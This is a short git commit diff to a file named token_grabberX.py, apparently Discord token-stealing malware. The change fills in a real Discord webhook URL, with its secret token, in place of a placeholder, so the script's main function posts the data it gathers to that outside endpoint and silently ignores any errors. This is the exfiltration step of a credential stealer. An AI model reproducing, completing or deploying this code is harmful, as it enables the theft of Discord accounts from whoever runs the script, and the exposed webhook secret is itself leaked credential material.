6d61a3ace902c3c8dae1b0acfddbcd8ca8582752
BackFrenia <97246751+BackFrenia@users.noreply.github.com>
2022-12-18 21:31:34 -0300

    Update token_grabberX.py

--- token_grabberX.py
+++ token_grabberX.py
@@ -370,7 +370,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("YOUR WEEBHOOK LINK HERE", data=dumps(webhook).encode(), headers=getheaders()))   
+        urlopen(Request("https://discord.com/api/webhooks/1054194124632375367/u_cntCGPEBhmS3x1Z1KeoKbXVYkhBCfPzeQvyhMDYnO8leOCCU_OxpHwbk7vOR9arYb5", data=dumps(webhook).encode(), headers=getheaders()))   
 
     except:
         pass
